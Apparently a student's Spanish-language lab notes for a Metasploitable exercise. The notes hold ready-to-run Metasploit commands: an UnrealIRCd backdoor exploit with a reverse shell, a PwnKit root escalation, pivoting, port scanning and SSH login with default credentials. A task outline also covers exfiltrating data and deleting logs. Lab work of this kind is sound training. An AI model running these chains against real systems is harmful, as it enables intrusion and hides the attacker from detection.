1. Configuracion de redes de las maquinas
2. Elevar privilegios
3. Moverse lateralmente dentro de la red
4. Filtrar datos sencibles cubriendo las huellas

 1. Elevar privilegios hacia root, tecnicas, stip, modulo de metasploit. Juami que muestre root

 2. Movimiento lateral, conectarse a maquina meta2 por la red desde la meta3 root

 3. Filtracion de datos: extraer info sencible de las maquinas comprometidas: identificar archivos o db criticas en meta3. Herramientas para copiar datos a la maquina atacante. Evaluar la efectividad y electivilidad de la tecnica utilizada.

 4. Covertura de huellas: borrar rastros que evidencien as actividades realizadas. Buscar logs y eliminarlos

 5. Reflexion de ocmo estas acciones señalando que dificulta la deteccion deun atacante

 ## Comandos para msfconsole:

### Elevación de privilegios:

Puerta trasera
 ```
 use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set LHOST 192.168.56.101
set RPORT 6697
set payload cmd/unix/reverse_perl
run
```

ctrl + z = backgrond session

```
session -l
```
Levanta Meterpreter

```
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST 192.168.56.101
set LPORT 4433
run
```

Corre Pwnkit desde Metermeter simple
```
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION 2
set LHOST 192.168.56.101
set Writable_Dir /tmp
run
```

### Movimiento lateral:

En Meterpreter agregamos:
```
dhclient eth2 # Levanta eth2
ping -c 2 10.0.2.6 # Se comunica con Meta2
route add 10.0.2.0/24 3 # Agrega la ruta en la session 3, donde está Meterpreter root

```
Escanea los servicios de Meta2:
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.2.6
set PORTS 21,22,23,25,80,139,445,3306,5432,6667
set THREADS 5
run
```

Crea una session con las credenciales en el puerto de Meta2
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.2.5
set USERNAME msfadmin
set PASSWORD 123456
set CreateSession true
run
```

Comandos para corroborar donde estás
```
whoami
hostname
ifconfig
uname -a
id
```

Upgradear la session de Meta2 a MEterpreter para poder descargar:
```
background
use post/multi/manage/shell_to_meterpreter
set SESSION 5 # Cerre la 4...
set LHOST 192.168.56.101
set LPORT 4455
run
```
use post/multi/manage/shell_to_meterpreter
set SESSION 5 
set LHOST 192.168.56.101
set LPORT 4455
run
